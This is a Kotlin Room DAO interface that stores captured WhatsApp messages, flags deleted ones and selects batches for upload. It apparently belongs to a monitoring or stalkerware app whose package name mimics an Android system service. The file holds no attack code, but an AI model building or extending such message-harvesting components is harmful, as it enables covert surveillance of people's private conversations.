package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.WhatsAppUnrooted
import com.android.services.util.AppConstants

@Dao
interface WhatsAppUnrootedDao {


    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(WhatsAppUnrooted: WhatsAppUnrooted)

    @Query("Select uniqueId from whatsapp_unrooted_table where uniqueId = :messageId")
    fun checkIfAlreadyExist(messageId: String): String?

    @Query("Select * from whatsapp_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllWhatsAppUnrootedLogs(status: Int): List<WhatsAppUnrooted>

    @Query("Update whatsapp_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int

    @Query("Update whatsapp_unrooted_table set isDeleted=:isDeleted where uniqueId=:id")
    fun updateMessage(id: String, isDeleted: Int)
}